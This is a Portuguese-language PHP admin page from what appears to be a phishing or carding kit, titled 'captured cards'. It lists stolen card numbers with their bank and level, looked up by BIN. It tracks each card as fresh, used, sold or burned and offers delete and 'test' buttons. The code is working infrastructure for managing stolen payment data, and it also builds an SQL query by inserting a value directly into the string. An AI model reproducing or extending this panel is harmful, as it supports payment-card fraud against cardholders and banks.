
<div class="row bg-title">
    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        <h4 class="page-title">Dashboard</h4> </div>
    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
        <ol class="breadcrumb">
            <li><a href="#">Cartões capturados</a></li>
        </ol>
    </div>
    <!-- /.col-lg-12 -->
</div>
<!-- ============================================================== -->
<!-- table -->
<!-- ============================================================== -->
<div class="row">
    <div class="col-md-12 col-lg-12 col-sm-12">
        <div class="white-box">
            <table class="table">
              <thead class="thead-dark">
                <tr>
                  <th scope="col">#</th>
                  <th scope="col">Número</th>
                  <th scope="col">Banco</th>
                  <th scope="col">Level</th>
                  <th scope="col">Tipo</th>
                  <th scope="col">Estado</th>
                  <th scope="col">Opções</th>
                </tr>
              </thead>
              <tbody>

                <?php
                $count = 1;
                $cartao = query("SELECT * FROM infos");
                while($row_cartao = assoc($cartao)):
                $bin_cc = str_replace(" ", "", $row_cartao['numero']);
                $bin_cc = substr($bin_cc, 0, 6);
                $bin = query("SELECT * FROM bins WHERE bin = '$bin_cc'");
                $row_bin = assoc($bin);
                ?>
                <tr>
                  <th scope="row"><?php echo $count++; ?></th>
                  <td><a href="index.php?adminunlocked&page=view&id=<?php echo $row_cartao['id']; ?>" target="_blank"><?php echo $row_cartao['numero']; ?></a></td>
                  <td><?php if($row_bin['banco'] == ""){echo '<b style="color:red;">DESCONHECIDO</b>';}else{echo $row_bin['banco'];} ?></td>
                  <td><?php if($row_bin['level'] == ""){echo '<b style="color:red;">DESCONHECIDO</b>';}else{echo $row_bin['level'];} ?></td>
                  <td><?php echo $row_cartao['tipo'];?></td>
                  <td><?php if($row_cartao['estado']==1){echo "Virgem";}elseif($row_cartao['estado']==2){echo "Usada";}elseif($row_cartao['estado']==3){echo "Vendida";}elseif($row_cartao['estado']==4){echo "Queimada";} ?></td>
                  <td><div class="btn-group" role="group" aria-label="Basic example"><button type="button" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal" data-whatever="<?php echo $row_cartao['id']; ?>">Excluir</button><a href="" class="btn btn-danger">Testar</a></div></td>
                </tr>
                <?php endwhile; ?>
              </tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Limpar</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        Deseja realmente excluir esse cartão?
        <div id="result"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
        <button type="button" class="btn btn-primary" id="excluir">Excluir</button>
      </div>
    </div>
  </div>
</div>

<script>
    $('#exampleModal').on('show.bs.modal', function (event) {
      var button = $(event.relatedTarget);
      var recipient = button.data('whatever');

      $('document').ready(function(){
        $('#excluir').click(function(){
            $.ajax({
                method: "POST",
                url: 'pages/excluir-cc.php',
                data: {
                    id: recipient
                },beforeSend: function(){
                    $('#result').html('<center><img width="50px" src="img/loading.gif"/></center>');
                }
            }).done(function(result){
                $('#result').html(result);
            });
        });
      });
    })
</script>